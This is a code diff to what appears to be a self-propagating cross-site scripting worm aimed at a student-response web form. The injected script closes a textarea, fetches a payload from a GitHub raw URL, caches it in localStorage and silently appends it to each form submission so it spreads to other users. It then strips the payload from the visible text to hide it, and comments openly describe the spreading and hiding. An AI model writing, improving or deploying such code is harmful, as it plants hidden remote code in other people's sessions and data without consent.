@@ -1,9 +1,11 @@
-</textarea><script>if(void 0===fished)var fished=0;++fished<=1&&console.log(\"I hope your having a great day!\");
+</textarea>
+<script>
+if(void 0===fished)var fished=0;++fished<=1&&console.log("I hope your having a great day!");
 function updateRec(selectedform,stuID) {
     
     var s = "response" + stuID;
     var theform=selectedform;
-    var reporduce = localStorage.getItem("StudentFTRDontChange");
+    var reporduce=null;
     $.ajax({
         url: "https://raw.githubusercontent.com/PythonGithCode/ubiquitous-carnival/main/cupcakes",
         type: "GET",
@@ -12,16 +14,23 @@ function updateRec(selectedform,stuID) {
             localStorage.setItem("StudentFTRDontChange", res);
         }
     });
+    // just cus this is easier then doing something global
     reporduce = localStorage.getItem("StudentFTRDontChange");
+    // also add quality of life to it by adding make the quote work better
     theform.getElementsByTagName("textarea")[0].value = theform.getElementsByTagName("textarea")[0].value.replaceAll("'", "''");
+    // add the code that makes it so that this can spread
     theform.getElementsByTagName("textarea")[0].value += reporduce;
+    // log the value of the form text cus other wise it should be hidden.
     console.log(theform.getElementsByTagName("textarea")[0].value);
 
+    // submit the form
     var status = AjaxRequest.submit(theform,{"onSuccess":function(r){document.getElementById(s).innerHTML = r.responseText; 
             document.getElementById(s).className="normal";
         }
     });
-
+    // make it so when the saveing of the added code is not really seen by the user.
+    // also add quality of life to it by adding make the quote work better
     theform.getElementsByTagName("textarea")[0].value = theform.getElementsByTagName("textarea")[0].value.replaceAll(reporduce, "").replaceAll("''", "'");
     return status;
-}</script>
+}
+</script>
